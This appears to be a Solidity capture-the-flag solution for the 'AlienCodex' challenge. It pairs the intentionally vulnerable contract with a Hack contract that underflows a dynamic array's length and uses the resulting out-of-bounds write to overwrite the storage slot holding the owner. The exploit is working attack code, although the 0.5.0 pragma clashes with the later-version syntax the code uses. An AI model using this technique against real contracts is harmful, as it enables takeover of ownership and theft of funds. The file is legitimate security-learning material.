// SPDX-License-Identifier: MIT
pragma solidity 0.5.0;

// //Objectives / Initial Thoughts
// 1 Make the length of array 2^256 by the underflow method
// 2 We have an idea that owner is at slot 0 (parent contract storage comes first)
// 3 Need to change assert to true
// 4 then can use the functin to sent a address as byte32?/?? ...

/*
slot 0 ---> owner(20 bytes), boolrray
slot 1 ----> Bytes32[] codex array..

h = keccak(1)
slot[keccak(1)] --> codex[0]
slot[h + 1] = codex[1]
slot[h + 2] = codex[2] .....

so we need h + i = 0 (this is what we need) so find i ... = 0 - h

we can use unchecked{} make it so that the comliper reverts back to is underflow/owerflow era

before solidity 0.8.0 it was unchecked that is underflow was possible so ... empty array - 1 = 2**256 

array.length-- was a method to reduce the lenght of array as well as remove the last item.

1st step is to call makecontact() --> sets contact to true ...
2nd step is to reduce length of array by 1 ---> call retract()
3rd step is to find the index where the array will rewrite solt 0
4th step use (revise) to rewrite slot 0 to the address of the owner

*/


import "../helpers/Ownable-05.sol";

interface IAlienCodex {
        function makeContact() external;
        function retract() external;
        function revise(uint256 i, bytes32 _content) external;
        function owner() external view returns (address);
    }

contract Hack {


    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();
        uint256 h = uint256(keccak256(abi.encode(1)));
        uint256 i;
        unchecked {
            i = 0 - h;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender);
    }
}




contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);//like require but consumes all gas
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}